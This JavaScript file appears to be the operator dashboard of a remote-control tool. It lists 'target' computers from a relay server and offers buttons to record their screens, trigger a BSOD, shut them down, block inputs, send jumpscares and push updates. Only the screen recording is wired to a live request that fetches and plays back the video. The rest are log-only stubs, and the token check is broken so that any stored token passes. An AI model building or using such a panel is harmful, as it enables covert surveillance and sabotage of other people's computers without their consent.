const token = window.location.href.replace(`${window.location.origin}/home`, '')
let computerItems = document.querySelectorAll('.computer-list li');
const computerList = document.querySelector('.computer-list');
const displayArea = document.querySelector('.display-area');
const displayText = document.querySelector('.display-text');
const displayBox = document.querySelector('.display-box');
const options = document.querySelector('.options');
const loader = document.querySelector('.loader');
const logs = document.querySelector('.logs');
const menu = document.querySelector('.menu');
const log = document.querySelector('.log');
const duration = 5;

let currentComputer = '';
let currentTime = '';
let retryNum = 0

const terminal = (function() {
    const terminal = function() {
        log.innerHTML += '<p class="init">[INIT] Terminal active.'
        log.scrollTop = log.scrollHeight;
    };

    terminal.clear = function() {
        log.innerHTML = ``
        log.scrollIntoView({
            behavior: 'smooth',
            block: 'end'
        });
    };

    terminal.log = function(message) {
        log.innerHTML += `<p>[LOG] ${message}</p>`
        log.scrollIntoView({
            behavior: 'smooth',
            block: 'end'
        });
    };

    terminal.warn = function(message) {
        log.innerHTML += `<p class="warn">[WARN] ${message}</p>`;
        log.scrollIntoView({
            behavior: 'smooth',
            block: 'end'
        });
    };

    terminal.error = function(message) {
        log.innerHTML += `<p class="error">[ERR!] ${message}</p>`;
        log.scrollIntoView({
            behavior: 'smooth',
            block: 'end'
        });
    }

    return terminal;
})();

async function refreshPCList() {
    const res = await fetch('https://cslckrwbcl.lrdevstudio.com/messages', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ all_computers: 'none' })
    });
    const computers = await res.json();
    computerList.innerHTML += computers.map(c => `<li>${c}</li>`).join('');
    terminal.log('Loaded computers.')
    computerItems = document.querySelectorAll('.computer-list li');
}

setTimeout(() => {
    if (token != '') {
        if (localStorage.getItem('cslckrmngr_token') == token.substring(7) || localStorage.getItem('cslckrmngr_token') != undefined) {
            terminal.log('Validated login')
            terminal.warn('Token will be required for authentication at all times.')
        } else {
            terminal.error('Incorrect login token')
            setTimeout(() => {
                localStorage.clear()
                window.location.href = '/'
            }, 1000)
        }
    } else {
        terminal.error('Incorrect login token')
        setTimeout(() => {
            localStorage.clear()
            window.location.href = '/'
        }, 1000)
    }
    loader.style.animation = 'fade-out 1s ease-in-out';
    setTimeout(() => {
        loader.style.display = 'none';
        menu.style.display = 'flex';
        menu.style.animation = 'fade-in 1s ease-in-out';
        setTimeout(() => {
            terminal()
        }, 1000)
    }, 1000);
}, 1000);

(async () => {

    let optionsMenu = null
    let computerName = null

    options.classList.add('disabled')
    options.style.pointerEvents = 'none'
    options.style.opacity = '0.4'

    function createOptionsMenu() {
        optionsMenu = document.createElement('div')
        optionsMenu.className = 'options-menu'
        optionsMenu.innerHTML = `
            <button data-action="record">Record Screen</button>
            <button data-action="clear">Clear Logs</button>
            <button data-action="jumpscare">Jumpscare</button>
            <button data-action="shutdown">Shutdown PC</button>
            <button data-action="bsod">BSOD</button>
            <button data-action="flash">Flash PC</button>
            <button data-action="block">Block Inputs</button>
            <button data-action="update">Release Update</button>
        `
        options.appendChild(optionsMenu)
    }

    options.addEventListener('click', () => {
        if (options.classList.contains('disabled')) return

        if (!optionsMenu) createOptionsMenu()

        optionsMenu.classList.toggle('show')
        options.classList.toggle('active')
    })

    document.addEventListener('click', e => {
        alert(e.target)
        if (e.target != options  && e.target != optionsMenu && optionsMenu.classList) {
            alert('bom')
            alert(optionsMenu)
            optionsMenu.classList.toggle('show')
            options.classList.remove('active')
        }
    })

    document.addEventListener('keydown', e => {
        if (e.key === 'Escape') closeOptionsMenu()
    })

    function openRecordPopup() {
        const overlay = document.createElement('div')
        overlay.style.position = 'fixed'
        overlay.style.inset = '0'
        overlay.style.background = 'rgba(0,0,0,0.6)'
        overlay.style.display = 'flex'
        overlay.style.alignItems = 'center'
        overlay.style.justifyContent = 'center'
        overlay.style.zIndex = '99999'

        const popup = document.createElement('div')
        popup.style.background = '#141414'
        popup.style.border = '1px solid #c2580280'
        popup.style.borderRadius = '10px'
        popup.style.padding = '20px'
        popup.style.width = '260px'
        popup.style.textAlign = 'center'

        popup.innerHTML = `
            <p style="margin:0 0 12px">Recording duration (seconds)</p>
            <input type="number" min="1" value="5" style="width:100%;padding:6px;margin-bottom:12px;background:#0f0f0f;color:#fff;border:1px solid #c2580280;border-radius:6px">
            <button style="width:100%;padding:8px;background:#c25802;border:none;border-radius:6px;color:#fff;cursor:pointer">Start Recording</button>
        `

        overlay.appendChild(popup)
        document.body.appendChild(overlay)

        const input = popup.querySelector('input')
        const btn = popup.querySelector('button')

        btn.addEventListener('click', async () => {
            const duration = Number(input.value)
            if (!duration || duration <= 0) return

            const now = new Date()
            const year = now.getFullYear()
            const month = String(now.getMonth() + 1).padStart(2, '0')
            const day = String(now.getDate()).padStart(2, '0')
            const hours = String(now.getHours()).padStart(2, '0')
            const minutes = String(now.getMinutes()).padStart(2, '0')

            currentTime = `${year}-${month}-${day}_${hours}-${minutes}`

            terminal.log(`POSTED: record-${computerName}-${currentTime} (${duration}s)`)

            await fetch('https://cslckrwbcl.lrdevstudio.com/messages', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    action: `record-${computerName}`,
                    time: currentTime,
                    duration: duration
                })
            })

            renderVideo(computerName, currentTime)

            overlay.remove()
            closeOptionsMenu()
        })

        overlay.addEventListener('click', e => {
            if (e.target === overlay) overlay.remove()
        })
    }

    document.addEventListener('click', e => {
        const btn = e.target.closest('.options-menu button')
        if (!btn) return

        const action = btn.dataset.action

        if (action === 'record') openRecordPopup()
        if (action === 'clear') terminal.clear()
        if (action === 'jumpscare') terminal.warn(`Jumpscare sent to ${computerName}`)
        if (action === 'shutdown') terminal.error('Shutdown signal sent')
        if (action === 'bsod') terminal.error('BSOD triggered')
        if (action === 'flash') terminal.warn('Flash command issued')
        if (action === 'block') terminal.warn('Inputs blocked')
        if (action === 'update') terminal.log('Update released')
    })

    const res = await fetch('https://cslckrwbcl.lrdevstudio.com/messages', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ all_computers: 'none' })
    })

    const computers = await res.json()
    computerList.innerHTML = computers.map(c => `<li>${c}</li>`).join('')
    terminal.log('Loaded computers.')

    computerItems = document.querySelectorAll('.computer-list li')

    computerItems.forEach(item => {
        item.addEventListener('click', () => {

            document.querySelectorAll('.computer-list li')
                .forEach(li => li.classList.remove('active'))
            item.classList.add('active')

            computerName = item.innerHTML.trim()

            options.classList.remove('disabled')
            options.style.pointerEvents = 'auto'
            options.style.opacity = '1'

            terminal.log(`Selected computer: ${computerName}`)
        })
    })

})();


async function renderVideo(computer, timestamp) {
    const res = await fetch('https://cslckrwbcl.lrdevstudio.com/messages');
    const text = await res.text();

    if (!text || text.trim() === '[]') {
        setTimeout(() => renderVideo(computer, timestamp), 1000);
    } else if (!text.includes('screen-recording-ready')) {
        terminal.warn("Wrong fetch, refunding post.")
        await fetch('https://cslckrwbcl.lrdevstudio.com/messages', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: text,
        });

        terminal.log("Refunded")
        retryNum += 1
        if (retryNum == 5) {
            terminal.error('Request not fetched, maybe target offline?')
            setTimeout(() => {
                displayText.innerHTML = 'No Display'
            }, 2000)
        } else {
            setTimeout(() => renderVideo(computer, timestamp), 1000);
        }
        return;
    } else if (text.includes('screen-recording-ready')) {
        terminal.log("Video ready, rendering")

        displayBox.outerHTML = `
            <video class='screen-rec' controls autoplay muted>
                <source src="/fetch_recording/${computer}/${timestamp}" type="video/mp4">
            </video>`;
        return;
    }
}
